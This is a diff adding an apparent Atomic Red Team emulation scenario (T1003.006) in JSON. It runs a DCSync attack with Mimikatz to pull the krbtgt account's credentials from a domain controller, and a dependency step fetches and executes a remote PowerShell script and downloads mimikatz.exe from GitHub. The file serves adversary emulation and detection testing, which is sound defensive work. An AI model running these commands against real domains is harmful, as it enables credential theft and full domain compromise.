@@ -1,0 +1,98 @@
+{
+  "id": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
+  "name": "DCSync (Active Directory)",
+  "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "40cbf20b-17d8-46b8-9f1d-4cb988e6147d",
+      "type": "execute-command",
+      "data": {
+        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5a513682-eaae-426c-a9f0-692490d35e08",
+      "name": "Check dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3300a1ef-364f-4eba-be17-198d91879463",
+      "name": "Resolve dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6b9e5010-244f-4f99-9808-58673bc7938d",
+      "name": "Re-check dependency 1/1",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "5a513682-eaae-426c-a9f0-692490d35e08",
+      "p": "on-success",
+      "o": "40cbf20b-17d8-46b8-9f1d-4cb988e6147d"
+    },
+    {
+      "s": "5a513682-eaae-426c-a9f0-692490d35e08",
+      "p": "on-failure",
+      "o": "3300a1ef-364f-4eba-be17-198d91879463"
+    },
+    {
+      "s": "3300a1ef-364f-4eba-be17-198d91879463",
+      "p": "on-success",
+      "o": "6b9e5010-244f-4f99-9808-58673bc7938d"
+    },
+    {
+      "s": "6b9e5010-244f-4f99-9808-58673bc7938d",
+      "p": "on-failure",
+      "o": "40cbf20b-17d8-46b8-9f1d-4cb988e6147d"
+    }
+  ],
+  "tags": [
+    "T1003.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain",
+      "type": "string",
+      "description": "Targeted Active Directory domain",
+      "value": "%userdnsdomain%"
+    },
+    {
+      "name": "user",
+      "type": "string",
+      "description": "Targeted user",
+      "value": "krbtgt"
+    },
+    {
+      "name": "mimikatz_path",
+      "type": "path",
+      "description": "Mimikatz windows executable",
+      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+    }
+  ]
+}
